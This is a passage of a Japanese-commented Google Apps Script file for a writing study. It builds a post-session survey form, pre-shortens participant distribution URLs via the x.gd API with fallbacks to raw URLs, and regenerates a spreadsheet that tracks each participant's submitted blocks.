  addSectionHeader(form, "4. 記入パッドについて", "文章を書いた画面についてです。");
  var pad = form.addMultipleChoiceItem();
  pad.setTitle("普段お使いのエディタと比べて、書きにくさはありましたか。");
  pad.setChoices([
    pad.createChoice("特に無かった"),
    pad.createChoice("少しあった"),
    pad.createChoice("かなりあった"),
  ]);
  form.addParagraphTextItem().setTitle("あった場合、どんな点でしたか（任意）。");
  var counter = form.addMultipleChoiceItem();
  counter.setTitle("画面の文字数表示は気になりましたか。");
  counter.setChoices([
    counter.createChoice("気にならなかった"),
    counter.createChoice("ときどき見た"),
    counter.createChoice("ずっと気にしていた"),
  ]);

  // --- 5. 生態学的妥当性の記録（§3.8-4）------------------------------------
  addSectionHeader(form, "5. 普段の作業について", "");
  var howoften = form.addMultipleChoiceItem();
  howoften.setTitle("普段、今回のような論述（資料を読んでまとめる文章）を書く機会はありますか。");
  howoften.setChoices([
    howoften.createChoice("よくある"),
    howoften.createChoice("ときどきある"),
    howoften.createChoice("ほとんどない"),
  ]);

  recordFormUrl_("G1_SURVEY", form, "G1-S 終了後アンケート（判定には使わない）");
  Logger.log("G1-S 終了後アンケートを構築した: " + form.getPublishedUrl());
}

// ============================================================
// x.gd 短縮 URL（任意・Phase1 は手作業で作っていたものを自動化する）
// ============================================================
// ★ **API キーを .gs にもリポジトリにも置かない。** 本リポジトリは一時 public にする運用があるため。
//   キーは Apps Script の **Script Properties** に置く。設定は 1 回だけ、エディタで次を実行する:
//
//     function setXgdKey() {
//       PropertiesService.getScriptProperties().setProperty("XGD_API_KEY", "★ここにキー★");
//     }
//     ⚠️ 実行したらこの関数は消すこと（エディタのソースにキーが残る）。
//
// ★ キー未設定なら**何もしないで戻る**（壊れない）。短縮は運用の利便であって、
//   実施に必須ではない（G1 は対面実施で、実験者がブックマークから開く）。
var XGD_KEY_PROP = "XGD_API_KEY";
var XGD_ENDPOINT = "https://xgd.io/V1/shorten";

// 短縮 URL を Script Properties に覚えておくキー（リンク集タブが読む）。
function shortUrlProp_(key) {
  return "SHORTURL_" + key;
}

function getShortUrl_(props, key) {
  return props.getProperty(shortUrlProp_(key)) || "";
}

// ============================================================
// ★★ 配布 URL の短縮（2026-08-08・研究者要望）
// ============================================================
// ⚠️ ★ **短縮は「見やすさ」のためであって、機能上の必要ではない。**
//   実測: 受付メール中の Drive URL は text/plain でも**折り返されていない**（リンクは切れていない）。
//
// ⚠️★★ したがって **失敗しても絶対に止めない。生の URL に落ちる。**
//   ★ 短縮できなかったせいでリンクが配られない、という事故を作らないためである。
//   （`shortenFormUrls()` が「短縮したつもりでエラー文字列を配る」を警戒しているのと同じ考え）
//
// ★ **送信時には短縮しない。** 事前に `shortenG1DistributionUrls()` で作って
//   Script Properties に貯めておき、送信時は**引くだけ**にする。理由:
//   ⚠️ `onG1ConsentSubmit` は登録の瞬間に走るトリガーであり、
//      そこで外部 API を叩くと**遅延と失敗が登録経路に乗る**。

/** ★ 短縮があればそれを、無ければ生の URL を返す（⚠️ 絶対に空を返さない）。 */
function g1ShortOr_(key, rawUrl) {
  if (!rawUrl) return rawUrl;
  try {
    var s = getShortUrl_(PropertiesService.getScriptProperties(), key);
    return s || rawUrl;
  } catch (e) {
    // ⚠️ ★ プロパティが読めなくても生の URL は返す。ここで例外を投げない。
    return rawUrl;
  }
}

/**
 * ★★ 被験者に配る**フォームの回答 URL**（2026-08-08 新設）。
 *
 * ⚠️ ★ **絶対に空を返さない。** 空を返すと本文に「リンクの無い案内」が載り、
 *    ★ 導線が無いのと同じになる（それが今回直している不具合そのものである）。
 * ⚠️ `shortenG1DistributionUrls()` は**アプリと課題ページしか短縮しない**。
 *    フォームの短縮は `shortenFormUrls()` 側（`SHORTURL_G1_MCHECK` / `SHORTURL_G1_SURVEY`）である。
 *
 * 3 段に落ちる:
 *   1. 短縮 `SHORTURL_<key>`（`shortenFormUrls()` が作る）
 *   2. `FORMURL_<key>` の `publishedUrl`（`recordFormUrl_` がフォーム構築時に保存する）
 *   3. ★ 編集 ID から回答 URL を組み立てる（プロパティが 1 つも無くてもリンクは配る）
 *      ⚠️ 3 は最後の砦である。⚠️ 匿名で開けることを curl（Cookie 無し）で実測して採用した
 *      （`/forms/d/<id>/viewform` → 公開 URL `/forms/d/e/…/viewform` へ 302）。
 */
function g1FormLink_(key, formId) {
  var published = "";
  try {
    var props = PropertiesService.getScriptProperties();
    var s = getShortUrl_(props, key);
    if (s) return s;
    var raw = props.getProperty("FORMURL_" + key);
    if (raw) published = JSON.parse(raw).publishedUrl || "";
  } catch (e) {
    // ⚠️ ★ プロパティが読めなくてもリンクは配る。ここで例外を投げない。
  }
  if (published) return published;
  return "https://docs.google.com/forms/d/" + formId + "/viewform";
}

/** ★ 課題ページ（被験者ごと）の短縮キー。 */
function g1MaterialsShortKey_(pid) {
  return "G1_MATERIALS_" + String(pid == null ? "" : pid).trim();
}

/**
 * ★ 1 本短縮して Script Properties に保存する。
 * @return {string} "" = 成功 / それ以外 = 失敗理由（⚠️ 呼び出し側が**握りつぶさない**）
 */
function g1ShortenOne_(props, apiKey, key, rawUrl) {
  // ⚠️★ 既にあるものを上書きしない。★ 配布済みの短縮 URL を生かしたままにするため。
  if (getShortUrl_(props, key)) return "";
  var url =
    XGD_ENDPOINT +
    "?key=" + encodeURIComponent(apiKey) +
    "&url=" + encodeURIComponent(rawUrl) +
    "&analytics=false";
  var res, body, json = null;
  try {
    res = UrlFetchApp.fetch(url, { muteHttpExceptions: true });
    body = res.getContentText();
  } catch (e) {
    return "通信に失敗: " + e;
  }
  try {
    json = JSON.parse(body);
  } catch (e) {
    /* JSON でない = API 側の異常 */
  }
  if (!json || json.status !== 200 || !json.shorturl) {
    return "HTTP " + res.getResponseCode() + " — " +
      (json && json.message ? json.message : String(body).slice(0, 200));
  }
  props.setProperty(shortUrlProp_(key), json.shorturl);
  return "";
}

/**
 * ★★ 配布 URL（アプリ ＋ 被験者ごとの課題ページ）を**事前に**短縮してキャッシュする。
 *
 * ★ 何度実行してもよい（既にあるものは触らない）。
 * ⚠️ ★ **これを実行しなくてもメールは出る**（生の URL になるだけ）。
 * ⚠️ 課題ページのフォルダがまだ無い P-ID は飛ばす。★ 用意してから実行し直すこと。
 */
function shortenG1DistributionUrls() {
  var props = PropertiesService.getScriptProperties();
  var apiKey = props.getProperty(XGD_KEY_PROP);
  if (!apiKey) {
    Logger.log("ℹ️ " + XGD_KEY_PROP + " が未設定なので短縮しません（★ 実施には支障なし。生の URL が配られます）。");
    return;
  }

  var done = 0, skipped = 0, failed = 0, notReady = 0;

  // --- 1. アプリ配布 URL（★ 全員共通） ---
  if (getShortUrl_(props, "G1_APP")) {
    Logger.log("· アプリ: 既に短縮済み（" + getShortUrl_(props, "G1_APP") + "）");
    skipped++;
  } else {
    var e1 = g1ShortenOne_(props, apiKey, "G1_APP", G1_APP_DOWNLOAD_URL);
    if (e1) { Logger.log("❌ アプリ: " + e1); failed++; }
    else { Logger.log("✅ アプリ: " + getShortUrl_(props, "G1_APP")); done++; }
  }

  // --- 2. 課題ページ（★ 被験者ごと） ---
  var pids = [];
  try {
    var roster = SpreadsheetApp.openById(PHASE1_MGMT_SHEET_ID).getSheetByName("参加者ロスター");
    pids = roster ? g1RosterParticipantIds_(roster) : [];
  } catch (e) {
    Logger.log("❌ ロスターを読めません: " + e);
    return;
  }
  if (!pids.length) {
    Logger.log("⚠️ ロスターに P-ID が 1 つもありません（★ 管理シートを取り違えていないか確認）。");
  }

  for (var i = 0; i < pids.length; i++) {
    var pid = pids[i];
    var k = g1MaterialsShortKey_(pid);
    if (getShortUrl_(props, k)) { skipped++; continue; }
    var found = g1MaterialsUrlForPid_(pid);
    if (!found.url) {
      Logger.log("· " + pid + ": まだ用意できていないので飛ばす（" + found.problem + "）");
      notReady++;
      continue;
    }
    var err = g1ShortenOne_(props, apiKey, k, found.url);
    if (err) { Logger.log("❌ " + pid + ": " + err); failed++; }
    else { Logger.log("✅ " + pid + ": " + getShortUrl_(props, k)); done++; }
  }

  Logger.log("--------");
  Logger.log("★ 新規 " + done + " 件 / 既存 " + skipped + " 件 / 未用意 " + notReady + " 件 / 失敗 " + failed + " 件");
  if (failed) {
    Logger.log("⚠️ ★ 失敗した分は**生の URL で配られます**（リンクは切れません）。直したら実行し直してください。");
  }
  if (notReady) {
    Logger.log("⚠️ ★ 未用意の分は課題フォルダを作ってから実行し直してください。");
  }
  Logger.log("★ 実際の本文は previewRegisterAckEmail() で確かめること。");
}

/**
 * ⚠️ 短縮 URL を捨てて作り直せるようにする（★ **配布前にだけ**使うこと）。
 * ⚠️★ 既に配ったメールの短縮 URL は x.gd 側に残るので**生きたまま**である。
 *   ここで消えるのは「次に送るメールが引く先」だけである。
 */
function clearG1DistributionShortUrls() {
  var props = PropertiesService.getScriptProperties();
  var all = props.getProperties();
  var n = 0;
  for (var name in all) {
    if (name === shortUrlProp_("G1_APP") || name.indexOf(shortUrlProp_("G1_MATERIALS_")) === 0) {
      props.deleteProperty(name);
      n++;
    }
  }
  Logger.log("🧹 配布 URL の短縮を " + n + " 件消しました。⚠️ 既に配った URL は生きたまま残ります。");
}

/**
 * ★ 3 フォームの「回答用 URL」を x.gd で短縮し、Script Properties に保存する。
 *
 * 冪等: **既に短縮済みのものは作り直さない**（毎回叩くと別の短縮 URL が量産され、
 * 被験者に配った URL と集計が読む URL がズレる — Phase1 の FormApp.create と同じ壊れ方）。
 * 作り直したいときは Script Properties の SHORTURL_* を消してから再実行する。
 */
function shortenFormUrls() {
  var props = PropertiesService.getScriptProperties();
  var key = props.getProperty(XGD_KEY_PROP);
  if (!key) {
    Logger.log(
      "ℹ️ " + XGD_KEY_PROP + " が未設定なので短縮しない（実施には支障なし）。\n" +
        "   設定する場合: PropertiesService.getScriptProperties()" +
        '.setProperty("' + XGD_KEY_PROP + '", "…") を 1 回だけ実行し、その関数を消すこと。'
    );
    return;
  }

  ["G1_CONSENT", "G1_MCHECK", "G1_SURVEY"].forEach(function (k) {
    if (getShortUrl_(props, k)) {
      Logger.log("· " + k + ": 既に短縮済みなので触らない（" + getShortUrl_(props, k) + "）");
      return;
    }
    var raw = props.getProperty("FORMURL_" + k);
    if (!raw) {
      Logger.log("· " + k + ": フォーム未生成のため飛ばす");
      return;
    }
    var published = JSON.parse(raw).publishedUrl;
    if (!published) {
      Logger.log("· " + k + ": publishedUrl が空のため飛ばす");
      return;
    }
    var url =
      XGD_ENDPOINT +
      "?key=" + encodeURIComponent(key) +
      "&url=" + encodeURIComponent(published) +
      "&analytics=false";
    var res = UrlFetchApp.fetch(url, { muteHttpExceptions: true });
    var body = res.getContentText();
    var json = null;
    try {
      json = JSON.parse(body);
    } catch (e) {
      /* JSON でない = API 側の異常 */
    }
    // ⚠️ ★ 失敗を黙って飛ばさない。status を見ずに body を保存すると
    //    「短縮したつもりでエラー文字列を配る」事故になる。
    if (!json || json.status !== 200 || !json.shorturl) {
      Logger.log(
        "❌ " + k + ": 短縮に失敗した (HTTP " + res.getResponseCode() + ") — " +
          (json && json.message ? json.message : body.slice(0, 200))
      );
      return;
    }
    props.setProperty(shortUrlProp_(k), json.shorturl);
    Logger.log("✅ " + k + ": " + json.shorturl + "  →  " + published);
  });

  Logger.log("★ リンク集タブへ反映するには buildManagementSheet() を実行する。");
}

/** 短縮 URL を捨てて作り直せるようにする（配布前にだけ使うこと）。 */
function clearShortUrls() {
  var props = PropertiesService.getScriptProperties();
  ["G1_CONSENT", "G1_MCHECK", "G1_SURVEY"].forEach(function (k) {
    props.deleteProperty(shortUrlProp_(k));
  });
  Logger.log("🧹 短縮 URL を消した。⚠️ 既に配布済みなら、配った URL は生きたまま残る。");
}

// ============================================================
// 運用管理シート（Phase1 の buildManagementSheet と同じ型・★ 2 タブだけ）
// ============================================================
// Phase1 は「リンク集 / 参加者ロスター / セッション提出トラッキング / 進捗ダッシュボード」の
// 4 タブを持つ。★ G1 は **リンク集 / G1 実施トラッキング の 2 タブだけ**にする:
//   - **参加者ロスターを作らない** — P-ID と実名の対応表は Phase1 側が真実源だから（上記）。
//     2 か所に持つと必ずずれるうえ、PII の複製が増える。
//   - **進捗ダッシュボードを作らない** — G1 は 1 人 1 回の実施機会で完結するので、
//     Phase1 のような長期追跡の集計値（平均セッション数・継続率）に意味が無い。
function buildManagementSheet() {
  var props = PropertiesService.getScriptProperties();
  var ss = null;
  var ssId = props.getProperty(MGMT_SHEET_PROP_G1);
  if (ssId) {
    try {
      ss = SpreadsheetApp.openById(ssId);
    } catch (e) {
      ss = null; // 削除済み等 → 作り直す
    }
  }
  if (!ss) {
    ss = SpreadsheetApp.create("GSE G1 運用管理シート");
    props.setProperty(MGMT_SHEET_PROP_G1, ss.getId());
  }

  buildLinksTab_(ss, props); // 毎回 URL を再集約（手動入力セルは保持する）
  buildRunTab_(ss); // 既存があれば作らない（入力データを破壊しない）
  applyRunValidation_(ss); // ドロップダウン（型付き列に起因する読込順の事故を避ける）
  refreshSubmissionTab_(ss); // ★ 最後: 全部が導出値なので、実施トラッキングが整ってから描く

  ["シート1", "Sheet1"].forEach(function (n) {
    var s = ss.getSheetByName(n);
    if (s && ss.getSheets().length > 1) ss.deleteSheet(s);
  });

  Logger.log("✅ G1 管理シート作成/更新完了");
  Logger.log("🔗 " + ss.getUrl());
  return ss.getUrl();
}

// ============================================================
// セッション提出トラッキング（★ 全部が導出値・手動編集禁止）
// ============================================================
// ⚠️★ **Phase1 の buildSubmissionTab_ をそのまま写していない。** Phase1 のそれは
//   ヘッダ + ダミー 1 行だけの**手書き用の空タブ**で、埋めるコードがどこにも無い。
//   ★ 無人・在宅（第 13 版）で「誰も埋めないタブ」を増やすのは、無いより悪い
//   （見て「空だから提出ゼロ」と読み違える）。
//
// ★ G1 には自動化の材料が既にある:
//     g1CollectSubmittedBlocks_()  … 受け口フォルダの `.age` を **ブロック単位**で拾う
//     g1CountResponsesByPid_()     … G1-M に**どのブロックで**答えたかを拾う
//   → 全部を導出する。手入力の列は **1 つも作らない**。
//
// ★ ここが答えるのは、19 列の「G1 実施トラッキング」が答えられないこと:
//   「完了ブロック数(/10) = 7」の **どの 3 つが欠けているか**。
//   ⚠️ 在宅では研究者が見ていないので、これが分からないと問い合わせ文が書けない。
//
// ⚠️ 行は **「G1 実施トラッキング」の P-ID から作る**（受け口フォルダからは作らない）。
//   フォルダ側を真実源にすると、打ち間違えた P-ID がそのまま被験者として並ぶ。
//   ★ 代わりに「シートに居ない P-ID の .age」は**別枠で警告として出す**（黙って捨てない）。

var SUBMIT_TAB_NAME = "セッション提出トラッキング";
/** G1 は **1 ブロック = 1 セッション**（ロガーがブロックごとにローテートする）。 */
var G1_BLOCK_COUNT = 10;
/** G1-M（ブロック直後の 1 問）を答える対象ブロック。★ 1・2・10 には比較対象が無い（§2.6）。 */
var G1_MCHECK_BLOCKS = [3, 4, 5, 6, 7, 8, 9];

/**
 * セッション提出トラッキングを描き直す。★ 冪等（毎回まるごと再描画する）。
 *
 * ⚠️ ★ 往復回数を増やさない。2026-08-08 に 200 行 × 19 列を列ごとに書いて
 *    **6 分の実行上限で落ちた**。→ 値は 1 回の setValues でまとめて書く。
 */
function refreshSubmissionTab_(ss) {
  var run = ss.getSheetByName("G1 実施トラッキング");
  if (!run) {
    Logger.log("⚠️ 「G1 実施トラッキング」が無いので " + SUBMIT_TAB_NAME + " は描けません");
    return;
  }
  try {
    assertRunHeader_(run);
  } catch (e) {
    // ⚠️ ★ ヘッダがずれている状態で P-ID 列を読むと**別の列**を読む。黙って進まない。
    Logger.log("❌ ヘッダが一致しないので " + SUBMIT_TAB_NAME + " を描きません: " +
      String(e.message).split("\n")[0]);
    return;
  }

  var pids = submissionPids_(run);
  var submitted = g1CollectSubmittedBlocks_(); // null = 受け口フォルダ未設定
  var mcheck = g1CountResponsesByPid_(FORM_ID_MCHECK, Q_BLOCK_NO);

  var sh = ss.getSheetByName(SUBMIT_TAB_NAME) || ss.insertSheet(SUBMIT_TAB_NAME);
  var rows = submissionRows_(pids, submitted, mcheck);
  var width = rows[0].length;

  // ⚠️★★ **結合を先に解く。** `clear()` は中身と書式を消すが、★ **結合は残る**。
  //   前回 `styleSubmissionTab_` が作った B1:P1 / B2:P2 の結合が残ったまま
  //   `setValues` すると、2 回目以降の再描画で壊れる
  //   （2026-08-08 の cross-review で Codex が指摘。★ 順序が逆だった）。
  //   ⚠️ このタブは毎時トリガーから何度も描き直されるので、
  //     **2 回目が動かない = 実質いつも壊れている**ことになる。
  unmergeAll_(sh);
  sh.clear();
  sh.getRange(1, 1, rows.length, width).setValues(rows); // ★ 往復 1 回
  styleSubmissionTab_(sh, rows.length, width);
  Logger.log("✅ " + SUBMIT_TAB_NAME + " を描き直しました（" + pids.length + " 名）");
}

/** 研究者が手で回すための入口（トリガーからは refreshG1RunSheet 経由で呼ばれる）。 */
function refreshSubmissionTab() {
  var ssId = PropertiesService.getScriptProperties().getProperty(MGMT_SHEET_PROP_G1);
  if (!ssId) {
    Logger.log("❌ G1 管理シートが未作成です（buildManagementSheet() を実行）");
    return;
  }
  refreshSubmissionTab_(SpreadsheetApp.openById(ssId));
}

/**
 * シート全体の結合を解く。★ `setValues` の**前**に呼ぶこと。
 *
 * ⚠️ `Sheet.clear()` は結合を残す。結合が残ったまま値を書くと、
 * 2 回目以降の再描画が壊れる（このタブは毎時描き直される）。
 */
function unmergeAll_(sh) {
  try {
    sh.getRange(1, 1, Math.max(sh.getMaxRows(), 1), Math.max(sh.getMaxColumns(), 1)).breakApart();
  } catch (e) {
    // ★ 結合が 1 つも無いときは例外にしない（新規タブの初回はここを通る）
    Logger.log("ℹ️ 結合の解除をスキップしました: " + e);
  }
}

/** 実施トラッキングの P-ID 列を上から読む（★ ここが行の真実源）。 */
function submissionPids_(run) {
  var last = run.getLastRow();
  if (last < 3) return [];
  var col = runCol_("P-ID");
  var vals = run.getRange(3, col, last - 2, 1).getValues();
  var out = [];
  for (var i = 0; i < vals.length; i++) {
    var pid = String(vals[i][0]).trim().toUpperCase();
    if (pid && out.indexOf(pid) < 0) out.push(pid);
  }
  return out;
}

/**
 * 表の中身を 2 次元配列で組む。★ Spreadsheet を触らないので**単体で検算できる**
 * （`testSubmissionRows()` が壊れた入力を通して赤を見る）。
 *
 * @param {string[]} pids 実施トラッキングに載っている P-ID
 * @param {Object|null} submitted g1CollectSubmittedBlocks_() の戻り（null = フォルダ未設定）
 * @param {Object} mcheck g1CountResponsesByPid_(FORM_ID_MCHECK, Q_BLOCK_NO) の戻り
 */
function submissionRows_(pids, submitted, mcheck) {
  var rows = [];
  var width = 1 + G1_BLOCK_COUNT + 5;

  function pad(arr) {
    while (arr.length < width) arr.push("");
    return arr;
  }

  // ⚠️★ バナーの本文は **B1**（A1 ではない）。A1 に置いて折返しを付けると、
  //   P-ID 列の幅（80px）の中で折り返されて**読めなくなる**。
  //   ★ 実施トラッキングで実証済みの形（A1 は結合に含めず、B1 以降を結合）に揃える。
  rows.push(pad([
    "⚠",
    "自動生成タブ・手動編集禁止（refreshG1RunSheet / buildManagementSheet で全再描画されます）。" +
      "★ G1 は 1 ブロック = 1 セッション（ロガーがブロックごとにローテートする）。",
  ]));
  rows.push(pad([
    "",
    submitted === null
      ? "❌ " + G1_SUBMIT_FOLDER_PROP + " が未設定なので、提出の有無を**見ていません**。" +
        "★ セルの `?` は「未提出」ではなく「分からない」です（受け口プロジェクトの FOLDER_ID を" +
        "スクリプト プロパティに入れると埋まります）。"
      : "✅=.age 到着 ／ ▲=.age は届いたが G1-M 未回答（3〜9 のみ） ／ 空=未着",
  ]));

  var header = ["P-ID"];
  for (var b = 1; b <= G1_BLOCK_COUNT; b++) header.push(("0" + b).slice(-2));
  header.push("提出(/10)", "欠けているブロック", "G1-M 未(3〜9)", "初回提出日", "状態");
  rows.push(header);

  for (var i = 0; i < pids.length; i++) {
    rows.push(submissionRowFor_(pids[i], submitted, mcheck));
  }
  if (!pids.length) rows.push(pad(["（実施トラッキングに P-ID がありません）"]));

  // ⚠️★ シートに居ない P-ID の .age を**黙って捨てない**。
  //   ★ 現実に起きる: 被験者がアプリに P-ID を打ち間違えると、その回の記録は
  //     「誰のものか分からないまま」受け口に溜まる。ここで気づけないと永久に気づけない。
  var orphans = submissionOrphans_(pids, submitted);
  if (orphans.length) {
    rows.push(pad([""]));
    rows.push(pad(["⚠ シートに無い P-ID の .age（★ 打ち間違いを疑う）"]));
    for (var j = 0; j < orphans.length; j++) {
      rows.push(pad([orphans[j].pid, "", "", "", "", "", "", "", "", "", "",
        orphans[j].blocks.length + " 本"]));
    }
  }
  return rows;
}

/** 1 人ぶんの行。★ `submitted === null`（フォルダ未設定）は「未着手」と区別する。 */
function submissionRowFor_(pid, submitted, mcheck) {
  var unknown = submitted === null; // ⚠️ 「提出が無い」ではなく「見ていない」
  var rec = !unknown && submitted[pid] ? submitted[pid] : null;
  var got = rec ? rec.blocks : [];
  var answered = (mcheck[pid] || []).map(function (s) {
    return parseInt(String(s).trim(), 10);
  });

  var row = [pid];
  var missing = [];
  var mMissing = [];
  for (var b = 1; b <= G1_BLOCK_COUNT; b++) {
    // ⚠️ ★ 見ていないときは空欄ではなく `?`。**空欄は「未着」を意味してしまう**
    //   （2026-08-08 cross-review: 凡例が「表は空になります」と言う一方で
    //     実際は全員が「未着手」に見え、★ 研究者が「全員未提出」と誤読しうる）。
    if (unknown) {
      row.push("?");
      continue;
    }
    var has = got.indexOf(b) >= 0;
    var needsM = G1_MCHECK_BLOCKS.indexOf(b) >= 0;
    if (!has) {
      row.push("");
      missing.push(b);
      continue;
    }
    if (needsM && answered.indexOf(b) < 0) {
      row.push("▲");
      mMissing.push(b);
    } else {
      row.push("✅");
    }
  }

  if (unknown) {
    row.push("", "", "", "", "⚠ 提出フォルダ未設定（見ていない）");
    return row;
  }

  // ⚠️ ★ 1〜10 の外のブロック番号を数に混ぜない。`g1ParseAgeName_` の正規表現は
  //   `block(\d{2,3})` を通すので、**壊れた名前なら 11 以上も入りうる**。
  //   混ぜると「提出(/10)」が 10 を超えて意味を失う。★ 別枠で警告にする。
  var inRange = got.filter(function (b) {
    return b >= 1 && b <= G1_BLOCK_COUNT;
  });
  var outOfRange = got.filter(function (b) {
    return b < 1 || b > G1_BLOCK_COUNT;
  });

  row.push(inRange.length);
  row.push(missing.length ? missing.join(",") : "");
  row.push(mMissing.length ? mMissing.join(",") : "");
  row.push(rec && rec.firstYmd ? submissionYmdLabel_(rec.firstYmd) : "");
  var status = submissionStatus_(inRange.length, mMissing.length);
  if (outOfRange.length) {
    status += "（⚠ 範囲外のブロック: " + outOfRange.join(",") + "）";
  }
  row.push(status);
  return row;
}

/** `YYYYMMDD` → `YYYY-MM-DD`（★ 壊れていれば元の文字列をそのまま出す）。 */
function submissionYmdLabel_(ymd) {
  var m = String(ymd).match(/^(\d{4})(\d{2})(\d{2})$/);
  return m ? m[1] + "-" + m[2] + "-" + m[3] : String(ymd);
}

/** 状態の一言。★ 研究者が「次に何をするか」で分かれるようにする。 */
function submissionStatus_(gotCount, mMissingCount) {
  if (gotCount === 0) return "未着手";
  if (gotCount < G1_BLOCK_COUNT) return "実施中 (" + gotCount + "/10)";
  if (mMissingCount > 0) return "⚠ 10 本そろったが G1-M 不足";
  return "完了";
}

/** シートに載っていない P-ID の提出を拾う。 */
function submissionOrphans_(pids, submitted) {
  var out = [];
  if (!submitted) return out;
  for (var pid in submitted) {
    if (!Object.prototype.hasOwnProperty.call(submitted, pid)) continue;
    if (pids.indexOf(pid) >= 0) continue;
    out.push({ pid: pid, blocks: submitted[pid].blocks });
  }
  return out;
}

/** 見た目。★ 「G1 実施トラッキング」と同じ配色に揃える（別物に見せない）。 */
function styleSubmissionTab_(sh, rowCount, width) {
  var NAVY = "#1a3a5c", RED = "#b71c1c";
  // ⚠️★★ **A1 を結合に含めない。** 含めると `setFrozenColumns(1)` が
  //   「結合されたセルの一部だけを含む列を固定することはできません」で落ちる
  //   （2026-08-08 に実施トラッキングで実測した罠。★ 同じ穴を踏み直さない）。
  //   ★ 解除は `refreshSubmissionTab_` が `setValues` の**前**に済ませてある。
  if (width > 1) {
    try {
      sh.getRange(1, 2, 1, width - 1).merge();
      sh.getRange(2, 2, 1, width - 1).merge();
    } catch (e) {
      Logger.log("ℹ️ バナーの結合をスキップしました: " + e);
    }
  }
  sh.getRange(1, 1, 1, width).setFontWeight("bold").setFontColor("#ffffff")
    .setBackground(RED).setWrap(true).setVerticalAlignment("middle")
    .setHorizontalAlignment("left").setFontSize(11);
  sh.setRowHeight(1, 34);
  sh.getRange(2, 1, 1, width).setFontSize(10).setFontColor("#57534e")
    .setWrap(true).setHorizontalAlignment("left");
  sh.getRange(3, 1, 1, width).setFontWeight("bold").setFontColor("#ffffff")
    .setBackground(NAVY).setHorizontalAlignment("center").setWrap(true);
  sh.setFrozenRows(3);
  // ⚠️★ バナーを A1 から結合しない（`setFrozenColumns(1)` が
  //   「結合されたセルの一部だけを含む列を固定することはできません」で落ちる・2026-08-08 実測）。
  sh.setFrozenColumns(1);
  sh.setColumnWidth(1, 80);
  for (var c = 2; c <= 1 + G1_BLOCK_COUNT; c++) sh.setColumnWidth(c, 38);
  sh.setColumnWidth(2 + G1_BLOCK_COUNT, 80);
  sh.setColumnWidth(3 + G1_BLOCK_COUNT, 150);
  sh.setColumnWidth(4 + G1_BLOCK_COUNT, 120);
  sh.setColumnWidth(5 + G1_BLOCK_COUNT, 100);
  sh.setColumnWidth(6 + G1_BLOCK_COUNT, 190);
  if (rowCount > 3) {
    sh.getRange(4, 2, rowCount - 3, G1_BLOCK_COUNT).setHorizontalAlignment("center");
  }
}

// リンク集: 3 フォームの URL を集約する。手動入力セル（B4/B5）は毎回退避して保持する。
function buildLinksTab_(ss, props) {
  var sh = ss.getSheetByName("リンク集") || ss.insertSheet("リンク集", 0);
  var prevPad = "";
  var prevDataset = "";
  try {
    prevPad = sh.getRange(4, 2).getValue();
    prevDataset = sh.getRange(5, 2).getValue();
  } catch (e) {
    /* 初回は空 */
  }
  sh.clear();
  var rows = [
    ["GSE G1 リンク集", "", "", ""],
    ["", "", "", ""],
    ["項目", "値 / URL", "種別", "備考"],
    [
      "ブロックページ (pages/<P-ID>/blockNN.html) の置き場",
      prevPad || "",
      "手動",
      "★ 課題文と記入欄を 1 画面にしたページ。**紙配布は 2026-08-03 に廃止した** (第 7 版 §2.13)。" +
        "実施前に `python3 build_task_pages.py --subject <P-ID>` で生成し、実施端末にコピーする。" +
        "⚠️ ブロック開始時に **そのブロックのファイルだけ**を、拡張機能なしのプロファイルで開く " +
        "(protocol.md §1.2)。次のファイルを先に開くと先読みで打鍵量の測定が壊れる",
    ],
    [
      "gse-dataset への送付先",
      prevDataset || "",
      "手動",
      "⚠️ G1 のセッションであることを明示して送る (data.md の B-4)。" +
        "第1週モードで回すため label_pool が Phase1 の較正と同じになる",
    ],
    ["", "", "", ""],
    ["フォーム", "タイトル", "編集URL", "回答URL（短縮があれば短縮版）"],
  ];
  ["G1_CONSENT", "G1_MCHECK", "G1_SURVEY"].forEach(function (k) {
    var raw = props.getProperty("FORMURL_" + k);
    // 回答 URL 列は短縮版(x.gd)を優先し、未作成なら publishedUrl にフォールバックする
    // （Phase1 の buildLinksTab_ と同じ考え方）。
    var shortUrl = getShortUrl_(props, k);
    if (raw) {
      var o = JSON.parse(raw);
      rows.push([k + "｜" + o.label, o.title, o.editUrl, shortUrl || o.publishedUrl]);
    } else {
      rows.push([k, "（未生成 — setupG1Forms を実行）", "", shortUrl]);
    }
  });
  rows.push(["", "", "", ""]);
  rows.push([
    "★ P-ID の採番元",
    "Phase1 運用管理シートの「参加者ロスター」",
    "参照",
    "⚠️ G1 では採番しない。同じ人には同じ P-ID を使う。新規は Phase1 側で採番してから回す",
  ]);
  sh.getRange(1, 1, rows.length, 4).setValues(rows);
  sh.getRange(1, 1).setFontWeight("bold").setFontSize(14);
  sh.getRange(3, 1, 1, 4).setFontWeight("bold");
  sh.getRange(7, 1, 1, 4).setFontWeight("bold");
  sh.setColumnWidth(1, 260);
  sh.setColumnWidth(2, 340);
  sh.setColumnWidth(3, 320);
  sh.setColumnWidth(4, 320);
}

// G1 実施トラッキングの列（1 被験者 1 行）。★ 実名・メールを持たない。
// ⚠️ ブロックごとの条件・題材・NDJSON 名は **ここに書かない**。
//    ラベルの真実源は記録用紙 → blocks/P0xx.json であり、二重に持つと必ずずれる
//    (protocol.md §2.3-1「転記は 1 方向だけ」)。
// ★★ 2026-08-08（第 13 版に合わせた整理・研究者判断）:
//   ⚠️ 「実施予定日」を**削除**した。★ 在宅実施では研究者が日程を握らないので、
//      常に空のまま残り、「予定を入れ忘れている」ように見えるだけだった（実測: 全行空）。
//      ★ 初回起動の同席日を残したいときは「備考」に書く。
//   ⚠️ 「配置(A/B)」を**削除**した。★ 配置は `assign.py` が P-ID から**決定的に**出す
//      （`protocol.md §2.1`「実験者が選ばない」）。シートに持つと二重真実源になり、
//      ★ このシート冒頭のバナー（条件・題材を書かない）とも噛み合わなかった。
//      → 見たいときは `python3 assign.py --subject P0NN` を実行する。
//   ⚠️ 「課題文リンク送信日」→「課題ページ送付日」に**改名**した（削除しない）。
//      ★ ★ この列は `g1AutoSendPendingMaterials()` の**冪等キー**である。消すと
//      **同じ人に 2 通目が再送される**（送信は取り消せない）。名前だけを実態に合わせた
//      （第 13 版では受付メール 1 通で渡すので「リンク送信」という別便は既定ではない）。
//   ⚠️ 「GSE_DISABLE_PROBES=1」→「G1モード確認」に**改名**した。★ launcher 時代の言い方で、
//      今は `g1.mode` マーカーの有無で決まる（`preregistration.md` 第 10 版 §5.4-5）。
//   ★ 「配布URL(短縮)」を**追加**した（導出列・`refreshG1RunSheet` が埋める）。
